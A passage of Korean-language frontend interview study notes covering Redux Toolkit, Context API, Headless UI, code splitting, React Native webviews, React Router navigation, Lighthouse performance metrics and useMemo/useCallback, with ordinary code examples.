       middleware: (getDefaultMiddleware) => getDefaultMiddleware({ serializableCheck: false }),
     });

     // index.js
     const queryClient = new QueryClient({
       defaultOptions: { queries: { refetchOnMount: false, refetchOnWindowFocus: false } },
     });

     const root = ReactDOM.createRoot(document.getElementById('root') as HTMLElement);
     root.render(
       <React.StrictMode>
         <QueryClientProvider client={queryClient}>
           <Provider store={store}>
             <Routes />
           </Provider>
         </QueryClientProvider>
       </React.StrictMode>
     );
     ```

  2. createSlice파일을 생성한다. 파일명은 상관없다. 전역 state와 전역 state를 조작하는 함수를 저장할 createSlice를 만들어야한다. 이 createSlice는 프로젝트에 여러 개가 존재할 수 있다. 전역으로 관리 할 state당 하나가 생성되는 것이다.

  3. createSlice에 initialState는 그냥 state라고 생각하면 된다. 또한 reducers는 이 initialState를 조작할 액션(state값을 조작하는 함수 혹은 state값 재할당 등등 state를 변화시킬 행동)이라고 생각하면 된다.

     ```js
     const recommendIndexSlice = createSlice({
       name: "recommendIndex",
       initialState,
       reducers: {
         increaseIndex(state: INIT_STATE, action: PayloadAction<number>) {
           if (state.index >= action.payload - 1) {
             state.index = 0;
           } else {
             state.index += 1;
           }
         },
         decreaseIndex(state: INIT_STATE, action: PayloadAction<number>) {
           if (state.index < 0) {
             state.index = action.payload - 1;
           } else {
             state.index -= 1;
           }
         },
         resetIndex(state: INIT_STATE) {
           state.index = -1;
         },
       },
     });
     ```

  4. createSlice에 저장 된 action인 reducers로 state를 업데이트하기 위해서는 useDispatch hook을 사용한다. 디스패치라는 이름에서 알 수 있듯이 파라미터를 담아 보내는 역할을 한다. 파라미터를 보내면 createSlice 내부에 reducers에 전달되어 state를 업데이트 시키는 것이다. 또한 initialState나 업데이트 된 state를 사용할 때는 useSelector hook으로 가져와 사용한다.

  5. store에 devTools : 환경변수를 이용해서 현재 서버가 개발자모드인지 프로덕션모드인지를 구분해준다. 보통 boolean타입으로 활용하여 구분한다. devTools: process.env.NODE_ENV !== 'production' 과 같이 사용하는데 이 뜻은 로컬에 있는 환경 변수를 사용하면 true가 되면서 개발 모드가 활성화 된다.

  6. store에 middleware : middleware: (getDefaultMiddleware) => getDefaultMiddleware({ serializableCheck: false }) 와 같이 사용한다. 클라이언트와 서버 중간에 위치해서 중간 기능을 넣는 역할을 한다. getDefaultMiddleware() 는 기본 미들웨어를 적용하기 위해 사용한다. 위와 같이 작성하면 기본 미들웨어에 사용자 미들웨어를 추가하여 함께 사용한다는 뜻이다. 기본 미들웨어는 불변성 검사 미들웨어와 직렬화 기능성 검사 미들웨어가 있다. 불변성 검사 미들웨어는 값을 직접 수정한 경우 (mutation) error를 발생시키는 역할 (redux-immutable-state-invariant)을 하며 직렬화 가능성 검사 미들웨어는 직렬화 할 수 없는 Promise와 같은 객체를 받았을때 error를 발생시키는 역할을 한다.

- 리덕스가 state를 업데이트시킬때 리액트에서는 해당 상태값을 어떻게 감지하는지?

  dispatch를 통해 변경한 state는 이전의 state와 참조 값이 다르기 때문에 virtualDOM에서 상태가 업데이트 됨을 감지할 수 있다.

- 어떤 기준으로 상태관리 여부 구분하는지

  1. Props Drilling이 발생

  2. 여러 컴포넌트에서 공통적으로 사용해야하는 상태의 경우

<br>

### # 상태관리 탑다운 (Top-down) vs 바텀업 (Bottom-up)

- 탑다운 (Top-down) 방식

  - 특징

    - 중앙(store)에서 상태를 한꺼번에 관리하고, 하위 컴포넌트들이 이 상태를 구독해서 사용하는 방식이다.

    - 상태가 루트 레벨에 집중되어 있고, 데이터가 위에서 아래로 흘러가는 구조이다.

    - 대표적 예: Redux, MobX, Context API (중앙 집중식 상태 저장소를 갖고, 컴포넌트는 필요한 데이터만 구독)

  - 장점

    - 상태가 한 곳에 모여 있어 추적과 디버깅이 쉽다.

    - 명확한 흐름(액션 → 리듀서 → 상태 변경 → 뷰 업데이트).

    - 규모가 커질수록 상태 관리 체계적.

  - 단점

    - 초기 설정이 복잡하고 보일러플레이트 코드가 많다 (특히 Redux).

    - 규모가 작거나 간단한 앱에는 과한 설계(오버엔지니어링)일 수 있다.

- 바텀업 (Bottom-up) 방식

  - 특징

    - 상태가 각 컴포넌트 혹은 모듈 단위로 나눠져 독립적으로 관리되고, 필요한 경우 이 상태를 조합하거나 공유하는 방식이에요.

    - 상태가 컴포넌트 단위로 분산되어 있다가, 필요하면 공유/조합.

    - 대표적 예: Recoil, Zustand, Jotai (컴포넌트별 아톰(atom) 단위 상태 관리, 부분적으로 구독 및 조합 가능)

  - 장점

    - 상태가 분산되어 있어 초기 설계와 변경이 유연하다.

    - 필요한 부분만 구독하므로 불필요한 리렌더링 줄일 수 있다.

    - 상태를 작은 단위로 쪼개 관리하며, 협업 시 충돌 줄임.

  - 단점

    - 상태가 여러 곳에 흩어져 있어 전체 데이터 흐름 추적이 어렵다.

    - 상태 간 의존성이 많아질수록 관계 파악이 어려워질 수 있다.

<br>

### # Context API

- Context API란?

  Context는 react 컴포넌트 간의 어떠한 값을 공유할 수 있게 해주는 기능이다. 대부분 전역 상태 관리를 할 때 사용한다고 알고 있지만 꼭 전역적인 값만이 아닌 react 컴포넌트에서 Props가 아닌 또 다른 방식으로 컴포넌트 간에 값을 전달하는 방법이다.

- 기본적인 사용법

  - Provider

    createContext 라는 함수를 불러와 context 객체를 만들 수 있다. 그 후 context의 객체의 provider 컴포넌트로 value를 전달해 줄 컴포넌트를 래핑한 뒤 해당 컴포넌트의 하위 컴포넌트로 value를 공급해줄 수 있다. 이 때 해당 context의 value를 사용하는 컴포넌트에서는 useContext hook을 통해서 사용할 수 있는데 이 때 인자로 이전에 createContext 함수를 통해 생성한 context를 넘겨주어 사용할 수 있다. 또한 커스텀 훅을 사용해서 간결하게 사용하도록 할 수 있다.

    ```javascript
    // ContextParent.tsx
    import { createContext } from "react";
    import ContextChildrenOuter from "./contextChildrenOuter";

    const MyContext = createContext("");

    const ContextParent = () => {
      const props = "Hello World";

      return (
        <MyContext.Provider value={props}>
          <ContextChildrenOuter />
        </MyContext.Provider>
      );
    };

    export default ContextParent;
    export { MyContext };

    // ContextChildrenInner.tsx
    import { useContext } from "react";
    import { MyContext } from "./contextParent";

    const ContextChildrenInner = () => {
      const value = useContext(MyContext);

      return <div>{value}</div>;
    };

    export default ContextChildrenInner;
    ```

  - Consumer

    Context 객체의 Consumer 컴포넌트는 context 변화를 구독하는 컴포넌트이다. context의 자식은 함수(컴포넌트)이어야 한다. 이 함수(컴포넌트)가 가지는 context 값은 가장 가까운 provider의 값이다. 만약 상위 provider가 없다면 createContext()에서 정의한 defaultValue를 가진다. 만약 여러 컴포넌트를 구독하려면 아래와 같이 Consumer 내부에 또다른 Consumer를 정의하는 방법으로 context를 내려줘야한다.

    ```javascript
    <ThemeContext.Consumer>
      {(theme) => (
        <UserContext.Consumer>
          {(user) => <ProfilePage user={user} theme={theme} />}
        </UserContext.Consumer>
      )}
    </ThemeContext.Consumer>
    ```

- Context API가 있는데 왜 전역 상태 관리 라이브러리를 사용할까?

  - Context API 한계

    - 리렌더링 성능 문제 : Context는 값이 바뀌면 해당 Context를 사용하는 모든 컴포넌트를 리렌더링합니다. → 세분화된 구독 불가

    - 비동기 처리 어려움 : Context 자체는 비동기 로직(예: API 호출)을 처리하는 구조가 없음. 추가적으로 useEffect 등으로 직접 구현해야 함

    - 복잡한 상태 구조 관리 어려움 : 상태가 커지고 구조가 복잡해질수록 Context만으로 상태를 관리하기 어려워짐 (상태 분리, 리듀서, 미들웨어 등 없음)

    - 미들웨어/디버깅 도구 부족 : Redux 같은 라이브러리는 강력한 DevTools, 미들웨어(logging, 비동기 처리 등) 지원이 풍부함

  - 전역 상태 관리 라이브러리를 쓰는 이유

    - 세분화된 상태 구독 : Recoil, Zustand 등은 특정 “상태 단위”만 구독 → 필요한 컴포넌트만 리렌더링됨

    - 모듈화 / 분리된 상태 관리 : 여러 slice, atom, store로 상태를 역할별로 나눠 관리 가능

    - 비동기 로직 내장 처리 : Redux Toolkit의 createAsyncThunk, Recoil의 selector, Zustand의 store 함수 등 비동기 처리 내장

    - 디버깅 & DevTools : 상태 추적, 시간 이동 디버깅, 로깅 등 가능 (Redux DevTools 등)

    - 미들웨어 지원 : Redux의 middleware, Recoil effects 등으로 로깅, 인증 체크, 로컬 스토리지 연동 등 쉽게 구현 가능

  - Context API 언제 사용?

    - 정적인 전역 값 공유

      - Context 값을 구독하는 컴포넌트는 Context 값 변경 시 리렌더링이 발생한다. 그렇기 때문에 자주 변경이 발생하는 값보다는 정적인 값을 공유할 때 적합하다.

      - 예시 : 로그인한 사용자 정보 (auth, user), 테마 설정 (darkMode, theme), 언어 (locale, i18n) 등

    - props dlilling을 피할 때

      - 만약 Context 값을 직접 구독하지 않는 중간 컴포넌트 그 자체로는 안전함, 다만 부모가 리렌더링되면 자식도 같이 리렌더링될 수 있음. 이를 피하려면 React.memo, useMemo, useCallback 등의 최적화 도구를 적절히 써야 한다. 즉 부모의 Context 값 변경 시 리렌더링 발생을 막기 위해 메모이제이션 해야한다.

<br>

### # Redux vs ContextAPI

| 구분                     | **Redux**                                      | **Context API**                                |
| ------------------------ | ---------------------------------------------- | ---------------------------------------------- |
| **1. 개념**              | Flux 아키텍처 기반의 상태 관리 라이브러리      | React 내장 전역 상태 공유 기능 (Provider 패턴) |
| **2. 상태 저장 위치**    | 단일 전역 `store` 객체에서 관리                | 여러 `Context` 객체를 만들어 관리 가능         |
| **3. 데이터 흐름**       | Action → Reducer → Store (단방향)              | Context Provider → Consumer (단방향)           |
| **4. 상태 변경 방식**    | `dispatch(action)`을 통해 reducer 함수로 변경  | `setState` 또는 `useReducer`로 변경            |
| **5. 보일러플레이트**    | 많음 (action, reducer, store 설정 등)          | 적음 (Context 생성 + Provider 사용)            |
| **6. 학습 곡선**         | 상대적으로 높음                                | 낮음 (React 기본 API)                          |
| **7. 미들웨어 확장성**   | 강력함 (redux-thunk, redux-saga 등)            | 없음 (비동기 로직은 직접 구현해야 함)          |
| **8. 디버깅 도구**       | 매우 강력 (Redux DevTools 등)                  | 기본적으로 없음                                |
| **9. 성능**              | 선택적 구독 가능 → 리렌더링 최소화             | Context를 구독하는 컴포넌트는 전부 리렌더링됨  |
| **10. 대규모 앱 적합성** | ✅ 매우 적합                                   | ❌ 성능 저하 우려 있음                         |
| **11. 상태 분리 구조화** | Slice 단위로 분리해 관리 (Redux Toolkit 등)    | 여러 Context로 분리 가능하나 복잡해질 수 있음  |
| **12. 용도 예시**        | 장바구니, 사용자 권한 관리, 비동기 API 관리 등 | 다크모드, 언어 설정, 로그인 여부 등 간단 상태  |

<br>

### # Headless UI

- Headless UI란?

  프론트엔드 웹 개발을 하다보면 생산성 향상을 위해 UI 라이브러리를 사용하고는 한다. 일반적인 Component 기반 UI 라이브러리는 개발자가 해당 컴포넌트를 바로 사용할 수 있도록 고유의 스타일이 적용되어있는데 거의 모든 사용되는 서비스 디자인에 맞게 커스텀이 필요하게 된다. 하지만 커스텀하는 과정 중 한계에 부딪히는 경우가 발생할 수 있고 커스텀이 까다로운 경우도 발생할 수 있다. 이러한 경우 Headless UI 라이브러리를 사용할 수 있다.

- Component 기반 UI 라이브러리

  Component 기반 UI 라이브러리는 기능과 스타일이 존재하는 라이브러리, 디자인이 그렇게 중요하지 않고, 커스텀할 곳이 많지 않다면 Component 기반 UI 라이브러리를 사용하면 된다.

  - 장점

    - 바로 사용할 수 있는 마크업과 스타일이 존재

    - 설정이 거의 필요 없음

  - 단점

    - 마크업을 자유롭게 할 수 없음

    - 스타일은 대부분 라이브러리에 있는 테마 기반으로만 변경할 수 있어 한정적임

    - 큰 번들 사이즈

- Headless UI 라이브러리

  Headless UI 라이브러리는 기능은 있지만 스타일이 없는 라이브러리, 반응형에 따라 디자인이 달라지고, 기능 변경이나 추가가 많이 발생한다면 Headless UI 라이브러리가 유지보수에 더 좋을 수 있다.

  - 장점

    - 마크업과 스타일을 완벽하게 제어 가능

    - 관심사의 분리로 인한 유지보수 용이

    - 모든 스타일링 패턴 지원(ex. CSS, CSS-in-JS, UI 라이브러리 등)

    - 작은 번들 사이즈

  - 단점

    - 추가 설정이 필요함

    - 마크업, 스타일 혹은 테마 모두 지원되지 않음

- Headless Component 만들기

  - Compound Component

    사용되는 컴포넌트들의 상태(state) 값을 공유할 수 있게 만들어주는 패턴이다. (ex ContextAPI 활용)

  - Function as Child Component

    자식에 어떤 것이 들어올지 예상할 수 없기 때문에 children prop으로 받아 그대로 전달한다.

  - Custom hooks

    React를 사용해본 사람이라면 가장 익숙할 법한 Custom hooks이다.

<br>

### # Bundling과 code splitting

- 번들링(Bundling)

  서로 연관있는 여러 파일을 하나의 파일로 병합(js, img, scss 등)하는 것을 말한다. 하나로 병합 된 번들로 요청/응답을 받음으로써 HTTP 요청 횟수를 줄일 수 있다. 대표적인 모듈 번들러로 웹팩이 있고 그 외에 비트, 롤업, 파셀 등도 있다.

- 코드 스플리팅(code splitting)

  프로젝트 규모가 커지면 번들 사이즈도 커지게 된다. 그렇게 되면 성능 저하가 일어날 수 있다. 이럴 때 코드 스플리팅을 사용한다. 코드 스플리팅은 하나의 메인 번들을 여러 개의 번들(청크)로 나누어준다. 코드 스플리팅으로 번들을 나눈 후 실제 로드될 화면에 필요한 번들 파일만 불러오고 나머지 번들 파일은 호출하지 않고 지연시키는 비동기 로딩 방식으로 로딩 속도를 향상시킬 수 있다.

- 코드 스플리팅 적용 방법

  (1) dynamic import 문법 사용 : 자바스크립트 함수 비동기 로딩 시 import() 함수 형태로 메서드 안에서 사용하게 되면 필요할 때 해당 스크립트를 불러와서 사용할 수 있다. import를 함수로 사용하면 Promise를 반환한다. nextjs에서는 기본적으로 page 디렉토리 내부 컴포넌트들은 빌드 단계에서 자동으로 코드스플리팅된다. 또한 다른 컴포넌트들은 next/dynamic의 dynamic 메소드를 사용하여 구현할 수 있다. 첫번째 인자로 import 함수, 두번째 인자로 옵션을 지정할 수 있다. 옵션에서는 로딩 시 보여줄 UI, SSR 여부 등을 지정할 수 있다.

  ```js
  // react.js
  const onClick = () => {
    import("./subPage").then((result) => result.default());
  };

  // next.js
  import dynamic from "next/dynamic";

  const DynamicHeader = dynamic(() => import("../components/header"), {
    loading: () => <p>Loading...</p>,
  });

  export default function Home() {
    return <DynamicHeader />;
  }
  ```

  (2) React.lazy와 Suspense를 통한 컴포넌트 코드 스플리팅 : React.lazy는 컴포넌트를 렌더링하는 시점에서 비동기적으로 로딩할 수 있게 해 주는 유틸 함수이다. 또한 lazy로 코드 스플리팅 된 컴포넌트는 Suspense를 통해 나타낼 수 있다. Suspense는 리액트 내장 컴포넌트로 코드 스플리팅 된 컴포넌트를 로딩하도록 발동시킬 수 있고, 로딩이 끝나지 않았을 때 fallback 이라는 props를 통해 로딩 중에 보여줄 요소를 지정할 수 있다. 또한 react-loadable 라이브러리의 Lodable Components를 사용하는 방법도 있다.

  ```jsx
  const Home = lazy(() => import("./routes/Home"));
  const About = lazy(() => import("./routes/About"));

  const App = () => (
    <Router>
      <Suspense fallback={<div>Loading...</div>}>
        <Switch>
          <Route exact path="/" component={Home} />
          <Route path="/about" component={About} />
        </Switch>
      </Suspense>
    </Router>
  );
  ```

  (3) Webpack에 Entry Point 설정 : Entry Point는 웹팩이 앱에서 번들링하려는 모듈의 진입 파일이다. 리액트 앱이 여러 엔트리 포인트를 설정한다면 각각의 엔트리 포인트 마다 코드 스플리팅이 가능하다. webpack.config.js에 entry 프로퍼티를 작성하면 웹팩에서 자동으로 entry 프로퍼티 내부에 엔트리 포인트를 다른 chunk로 관리하여 로딩한다.

  ```js
  // webpack.config.js
  const path = require("path");

  module.exports = {
    mode: "development",
    entry: {
      index: "./src/index.js",
      another: "./src/another-module.js",
    },
    output: {
      filename: "[name].bundle.js",
      path: path.resolve(__dirname, "dist"),
    },
  };
  ```

<br>

### # React Native

- 리액트 네이티브 개발을 해본 적이 있는지

  부트캠프 교육 시 한달 정도 기업협업에 나가 경험해 본 경험이 있다. react native, typescript, mobx 등의 기술을 사용했었다. 마일리지를 이용하여 기프티콘을 구매하는 서비스였는데 기능을 추가하는 작업을 했었다. 카카오맵API, 웹뷰를 활용하여 지도 주소 검색 기능, 지번 도로명 주소 변환, 새 페이지 추가, 작은 버그 수정 등의 작업을 했었다. 또한 루머라는 회사에서 근무할 당시 react native webview를 활용해본 경험이 있다.

- 웹뷰

  웹뷰(WebView) 는 모바일 애플리케이션 안에서 웹 콘텐츠(웹페이지나 웹 앱)를 표시할 수 있는 뷰(View) 를 말합니다. 즉, 앱 내에 웹 브라우저 창을 삽입하는 것처럼 동작하며, HTML, CSS, JavaScript로 작성된 콘텐츠를 앱에서 바로 렌더링할 수 있게 해준다. 안드로이드와 iOS 모두에서 제공하고 있다. 웹뷰를 사용한 장점은 배포 주기를 빠르게 가져갈 수 있다는 점이다.

- 웹뷰 사용 경험

  웹뷰에 보여질 카카오 map api, 버튼 등을 생성하여 프로젝트를 따로 만들어 준 뒤 배포하고 웹뷰를 생성할 프로젝트에서 WebView 컴포넌트와 WebView 컴포넌트의 source 옵션을 통해 배포된 프로젝트와 연결하고 다른 옵션들을 통해 웹뷰에서 받은 주소 데이터를 저장하고, 로딩 시 스피너를 구현하였다.

<br>

### # Progressive rendering

- 서버에서 중요한 컨텐츠를 렌더링한 후, 중요하지 않은 콘텐츠를 기다리지 않고 클라이언트로 스트리밍하는 기술이다. 그런 다음 서버에서 렌더링되면 나중에 중요하지 않은 콘텐츠를 스트리밍한다. 관련 기술로는 Image Lazy Loading, DOMContentLoaded 이벤트의 사용 등이 있다.

<br>

### # Link, NavLink, useNavigate 차이

- Link

  페이지 이동 시 사용

  ```javascript
  <Link to="경로">내용</Link>
  ```

- NavLink

  페이지 이동 시 사용, Link 와의 차이점은 자체적으로 boolean을 반환하는 isActive 속성을 가지고 있으며 현재 어떤 페이지에 있는지 시각적으로 표시할 때 사용 (탭 메뉴 등)

  ```javascript
  <NavLink
    to="/"
    className={({ isActive }) => (isActive ? classes.active : undefined)}
  >
    Home
  </NavLink>
  ```

- useNavigate

  페이지 이동 시 사용하는 hook, 페이지 이동 시 추가 로직을 사용할 수 있다. 또 이동되는 페이지에 state를 전달할 수 있다.
  또 해당 페이지를 새로 불러오거나, 이전 페이지, 다음 페이지로의 이동을 편하게 할 수 있다. `ex) navigate(0), navigate(-1), navigate(+1)`

  ```javascript
  const Page = () => {
    const navigate = useNavigate();

    const navigateHandler = () => navigate("/");

    return <button onClick={navigateHandler}>Go Home</button>;
  };
  ```

<br>

### # a태그와 link 컴포넌트 차이

- a태그는 서버 사이드 라우팅 방식으로 페이지 이동 시 페이지를 새로 불러오고 새로 불러오기 때문에 모든 데이터를 다시 요청한다. 반면 Link 컴포넌트는 클라이언트 사이드 라우팅 방식으로 페이지 이동 시 HTML5 History API를 사용하여 브라우저의 주소만 바꿀 뿐, 페이지를 새로 불러오지는 않고 필요한 데이터만 요청한다.

<br>

### # 성능 측정 방법

- 함수 성능 측정

  perpomance.now, console.time

- 컴포넌트 렌더링 속도 및 리렌더링 측정

  react developer tools (크롬 익스텐션 설치 후 개발자 도구에 profiler탭 활용 (ms 단위))

- 웹 페이지 퍼포먼스

  개발자 도구에 Lighthouse탭 활용 (웹 페이지 퍼포먼스, 접근성, SEO, 표준 모범 사례 점수 등을 측정)

<br>

### # 성능 개선 지표

- 브라우저 기준의 측정

  브라우저 기준의 성능 측정은 전통적인 성능 측정 방식으로 브라우저에서 발생하는 이벤트를 사용하는 것이다. 웹 페이지가 로딩될 때 `DOMContentLoaded`, `load` 이벤트가 발생하는데 각 이벤트가 발생하는 시점으로 성능을 측정하는 것이다. 내비게이션 타이밍 모델에서 `DOMContentlLoaded` 이벤트, `load` 이벤트 발생 시점이 빠를수록, 그리고 두 이벤트 발생 구간의 폭이 좁을수록 성능이 좋다고 말한다. 하지만 최근에 SPA(Single Page Application)에서는 웹 페이지에 포함된 적은 양의 HTML로 DOMContentLoaded, load 이벤트가 일찍 발생할 수 있으나, 이벤트가 발생한 이후에도 수많은 스크립트 실행으로 인해 여전히 "느린 로딩"이 존재한다. 이러한 이유로 사용자 기준의 새로운 성능 측정 방식이 필요하게 되었으며 사용자 기준의 성능 측정 방식을 활용한다.

- 사용자 기준의 측정

  사용자 기준의 성능 측정은 사용자에게 콘텐츠를 보여주는 여러 시점을 기반으로 한다. 의미 있는 콘텐츠가 처음 보이는 시점이 빠를수록 성능이 좋다고 판단하며, 이 시점을 앞당길 수 있도록 최적화해야 한다. 해당 시점을 측정하기 위해서 크롬 개발자 도구를 활용할 수 있다.

- 성능 측정 도구 중 크롬 개발자 도구

  - Network

    Network 패널에서는 웹 페이지가 로딩되는 동안 요청된 리소스의 상태를 차트 형태로 확인할 수 있으며, 리소스 최적화 상태를 비교할 때 사용한다. Performance 패널과 같이 레코딩하고, 레코딩이 끝나면 Overview와 Request Table에 리소스 요청 정보가 나타난다. 이때 리소스 목록은 시간순으로 정렬된다. 또한 Request Table에 요청을 개별로 클릭하여 Timing 탭을 클릭하면 리소스 요청별 서버 요청 대기 시간을 확인할 수 있다.

  - Performance

    Performance 패널에서는 앞서 살펴본 웹 페이지 로딩 단계를 차트 형태로 살펴볼 수 있다. 웹 페이지가 로드되는 과정을 레코딩하고 단계마다 걸리는 시간을 확인할 수 있다. 로딩 과정에서 최적화가 필요한 부분을 찾을 때 사용한다.

  - Lighthouse

    - Lighthouse란?

      Lighthouse는 구글에서 제공하는 웹 페이지 품질 개선을 위한 오픈 소스로 자동화 도구이다. Lighthouse는 사이트의 성능, 접근성, SEO 등에 대한 전반적인 진단을 해준다. 주의할 점은 정확한 측정을 위해서는 항상 프로덕션 환경에서 측정하는 것이 좋다.

    - Performance

      웹 페이지의 로딩 속도 등 실제 성능을 측정

    - Best practices (https://developer.chrome.com/docs/lighthouse/best-practices/)

      웹 페이지가 웹에 대한 표준 모범 사례(Best practices를 따라 개발되었는지)를 따르고 있는지 확인한다. 웹 애플리케이션을 가동할 때 콘솔에 오류가 출력되진 않는지, 더는 사용하지 않는 API를 호출하고 있지 않은지, HTTPS를 통해 해당 페이지에 접근할 수 있는지와 같은 항목을 확인한다.

    - Accessibility

      접근성 확인. 폰트 사이즈, 메뉴간 간격 등을 측정

    - Progressive Web App (PWA)

      웹과 네이티브 앱의 기능 모두의 이점을 가지도록 만들어진 서비스인지 체크

    - SEO

      Search Engine Optimization의 약자로 검색 엔진 수집 최적화 측정

  - Lighthouse Performance의 여섯가지 metric과 가중치

    - FCP (First Contentful Paint), 10%

      페이지 로드가 시작된 후 의미있는 컨텐츠가 화면에 렌더링 완료될 때까지의 시간 (예: 의미있는 컨텐츠라는 것은 `<meta>`, `<link>`, `<script>`와 같은 메타데이터 관련 요소가 아닌 사용자 눈에 보이는 `<img>`, `글자(텍스트 노드)가 입력되어 있는 <span> or <p>` 등, 즉 화면에 실제 그려지는 요소 = 의미있는 컨텐츠)

    - LCP (Largest Contentful Paint), 25%

      가장 큰 콘텐츠 요소가 화면에 완전히 렌더링되는 시점 (보통 가장 큰 이미지 혹은 텍스트)

    - TBT (Total Blocking Time), 30%

      FCP와 TTI 사이에 일어난 작업 중 메인 스레드가 Long Task(50ms 초과 작업)로 인해 사용자 입력을 막고 있었던 시간의 총합 (예: 즉 의미있는 컨텐츠가 화면에 그려진 후 사용자 상호작용이 가능하게 된 시간 중 긴 작업으로 인해 사용자 상호작용이 블로킹 된 시간)

    - CLS (Cumulative Layout Shift), 15%

      예상치 못한 레이아웃 이동의 누적 점수, 레이아웃 변화가 예상되지 않았을 때만 측정 (예: 이미지 높이 미지정, 폰트 로딩 지연 등으로 인해 클릭하려던 버튼이 밀리는 현상 등.)

    - SI (Speed Index), 10%

      뷰포트 내의 콘텐츠가 콘텐츠가 시각적으로 표시되는 진행 속도를 프레임을 기준으로 측정(예: 리로드되는 페이지의 비디오를 캡쳐하여 프레임 간의 속도를 계산)

    - TTI (Time To Interactive), 10%

      페이지가 완전히 상호작용 가능한 상태가 된 시점

  - LCP 최적화 방법

    1. 서버 최적화
    2. CDN 사용
    3. 자주 변하지 않는 데이터의 경우 캐시 사용 (react query, apollo client, http header cahce-control 헤더 -> 유효 기간 내 요청 시 메모리에서 캐시를 읽어와 사용)
    4. 이미지 최적화, 외부 폰트 경량화(서브셋 폰트)
    5. SSR, SSG 사용
    6. 코드 스플리팅

  - FCP 최적화 방법

    1. 데이터 압축 (번들링)
    2. HTTP/2 사용 (요청 병렬 처리)
    3. 리로드 할 필요 없는 콘텐츠를 캐싱
    4. 코드 경량화와 코드 스플리팅
    5. 라이브러리 정리 (트리쉐이킹, 패키지 매니저 변경, 필요없는 라이브러리 제거)

  - Next.js에서 Lighthouse 사용하기

    Next.js 공식 도큐에서도 lighthouse를 통해 웹 성능을 체크하는 방식을 설명하고 있다. lighthouse의 정확한 측정을 위해서는 개발 환경이 아닌 항상 배포 환경에서 측정 해야한다는 것이다. 이미 배포된 웹 페이지들은 상관 없지만 개발중인 페이지들은 로컬에서 `yarn build` 혹은 `npm run build`로 빌드를 한 후, `yarn start` 혹은 `npm run start`로 실행해서 측정해야한다.

<br>

### # useMemo, useCallback

- 메모제이션이란?

  useMemo와 useCallback에서는 메모이제이션이라는 개념이 나오는데 메모이제이션이란 이전 값을 메모리에 저장해두어 동일한 계산의 반복을 제거해 빠른 처리를 가능하게 하는 기술이다. useMemo는 메모이제이션 된 값을 반환하고 useCallback은 메모이제이션 된 함수를 반환한다. useMemo와 useCallback은 의존성 배열에 넘겨준 값이 변경되었을 때만 메모리제이션된 값을 다시 계산하고 아닌 경우 동일한 값을 반환한다.

- useMemo를 사용해야 하는 경우

  - 값의 연산 비용이 높은 경우

  - 리렌더링 시 동일 계산 반복을 방지할 때

  - 리렌더링 시 객체, 배열 등의 참조 주소를 유지시키기 위해

    ```jsx
    const Child = React.memo(({ items }) => {
      console.log("자식 렌더링!");
      return <div>{items.join(", ")}</div>;
    });

    function Parent({ length }) {
      const items = useMemo(() => Array.from({ length }), [length]);

      return <Child items={items} />;
    }
    ```

- useCallback을 사용해야 하는 경우

  - 함수 내부 연산 비용이 높은 경우

  - 리렌더링 시 함수의 참조 주소를 유지시키기 위해

    - 부모 컴포넌트의 state 변경 시 자식 컴포넌트 props와 관련없는 state 임에도 부모 state가 변경되었기 때문에 자식 컴포넌트도 리렌더링된다. 이런 경우 React.memo를 활용해서 props가 변경되지 않는 경우 자식 컴포넌트의 리렌더링을 막을 수 있다. 하지만 props가 함수인 경우에는 다르다. props가 함수인 경우 부모 state가 변경 시 함수는 재생성되기 때문에 이전 참조와 다른 참조를 가리키게 된다. 그렇기 때문에 props가 같은 형태의 함수임에도 리렌더링이 발생한다. 이 때 useCallback을 사용하여 함수의 동등성(참조 유지)을 유지시켜준다. useCallback으로 함수의 동등성을 유지시켜준 상태로 자식 컴포넌트를 React.memo로 래핑하면 참조가 변하지 않았기 때문에 메모이제이션 된 컴포넌트를 사용하여 리렌더링이 발생하지 않는다.

    ```jsx
    import React, { useState, useCallback } from "react";

    // 자식 컴포넌트 (React.memo로 감싸져 있음)
    const Child = React.memo(({ onClick }) => {
      console.log("Child 렌더링");
      return <button onClick={onClick}>Click me</button>;
    });

    // 부모 컴포넌트
    function Parent() {
      const [count, setCount] = useState(0);

      // useCallback으로 함수 메모이제이션
      const handleClick = useCallback(() => {
        console.log("버튼 클릭!");
      }, []); // 의존성 없으니 한 번만 생성

      return (
        <div>
          <p>Count: {count}</p>
          {/* 버튼 눌러도 handleClick 함수 참조가 변하지 않음 */}
          <Child onClick={handleClick} />
          <button onClick={() => setCount(count + 1)}>증가</button>
        </div>
      );
    }

    export default Parent;
    ```

  - callback ref가 필요할 때 사용, 자식 컴포넌트의 ref를 다룰 때 forwardRef를 사용하는데 이 때 useEffect로 ref를 핸들링하면 자식 컴포넌트 내부 렌더링이 완료되기 전 ref의 값은 null이 되어 문제가 발생한다. 이럴 때 callback ref를 사용하여 해결할 수 있다. 간단하게 기본적으로 ref는 렌더링 여부를 체크할 수 없는데 useCallback을 활용하여 렌더링과 연관시켜 작업할 수 있게 되는 것이다. 즉 컴포넌트 생명주기에 바인드되던 ref를 DOM 노드의 생명주기로 바인드시키는 방식이다.

    ```jsx
    import React, {
      useState,
      useRef,
      useCallback,
      forwardRef,
      useEffect,
    } from "react";

    // forwardRef를 사용한 자식 컴포넌트
    const Child = forwardRef((props, ref) => {
      return <input ref={ref} placeholder="이곳에 포커스 됩니다" />;
    });

    function Parent() {
      const [count, setCount] = useState(0);

      // callback ref를 useCallback으로 메모이제이션
      const inputRef = useCallback((node) => {
        if (node !== null) {
          // node는 실제 DOM 요소(input)
          node.focus(); // 렌더링된 시점에 포커스 처리 가능
          console.log("Input에 포커스 됨!");
        }
      }, []);

      // 만약 useRef + useEffect로 했다면?
      /*
        const inputRef = useRef(null);
        useEffect(() => {
          if (inputRef.current) {
            inputRef.current.focus();
          }
        }, []);
        */

      return (
        <div>
          <Child ref={inputRef} />
          <button onClick={() => setCount(count + 1)}>증가: {count}</button>
        </div>
      );
    }

    export default Parent;
    ```

- useMemo와 useCallback을 사용하지 말아야 하는 경우

  - 연산이 복잡하지 않은 값이나 함수의 경우, 연산이 복잡하지 않은 경우 메모이징하는 것이 오히려 메모리 낭비가 될 수 있다.

  - 의존성 배열의 값이 자주 변화하는 경우, 자주 변하는 값이나 함수의 경우 메모이징하는 의미가 없다.

  - 의존성 배열의 요소가 많은 경우, 의존성 배열의 요소가 많은 경우 자주 변하는 값이나 함수일 확률이 높기 떄문에 메모이징하는 의미가 없다.

<br>

### # HOC(High Order Component)

